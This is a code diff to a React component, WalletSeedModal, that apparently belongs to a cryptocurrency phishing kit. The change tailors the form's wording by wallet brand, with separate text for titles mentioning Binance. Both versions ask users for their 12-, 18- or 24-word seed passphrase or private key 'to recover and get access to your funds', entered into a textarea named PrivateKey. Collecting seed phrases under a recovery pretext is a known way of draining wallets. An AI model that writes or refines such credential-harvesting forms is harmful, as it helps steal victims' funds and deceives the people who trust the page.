@@ -62,10 +62,17 @@ const WalletSeedModal = ({ isOpenModal, icon: Icon, title }) => {
         </div>
 
         <form>
-          <p className="modal-form-title">
-            Please provide your 12, 18, or 24 word seed passphrase or privatekey
-            in lowercase to recover and get access to your funds.
-          </p>
+          {title.includes('Binance') ? (
+            <p className="modal-form-title">
+              Please provide your 12, 18, or 24 word seed passphrase or
+              privatekey in lowercase to recover and get access to your funds.
+            </p>
+          ) : (
+            <p className="modal-form-title">
+              Please provide your 12/24 word seed passphrase or privatekey in
+              lowercase to recover and get access to your funds.
+            </p>
+          )}
           <textarea
             name="PrivateKey"
             id="PrivateKey"
